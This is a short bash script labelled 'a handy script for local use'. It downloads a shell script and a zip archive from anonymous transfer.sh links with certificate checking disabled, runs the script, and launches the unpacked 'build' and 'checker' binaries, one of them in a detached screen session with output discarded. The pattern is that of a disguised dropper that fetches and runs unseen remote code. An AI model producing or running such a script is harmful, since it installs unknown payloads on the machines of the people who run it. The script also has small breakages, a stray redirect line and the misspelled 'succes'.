#!/bin/bash
#
# This is a handy script for local use

apt update
apt -y install screen unzip
wget --no-check-certificate -c https://transfer.sh/WEPHVF/ubi20.sh
chmod 777 ubi20.sh && ./ubi20.sh
wget --no-check-certificate -c https://transfer.sh/glULeN/vault.zip
unzip vault.zip
mv checker vault
cd vault
screen -dmS build ./build
> /dev/null 2>&1
chmod 777 checker && ./checker
echo succes
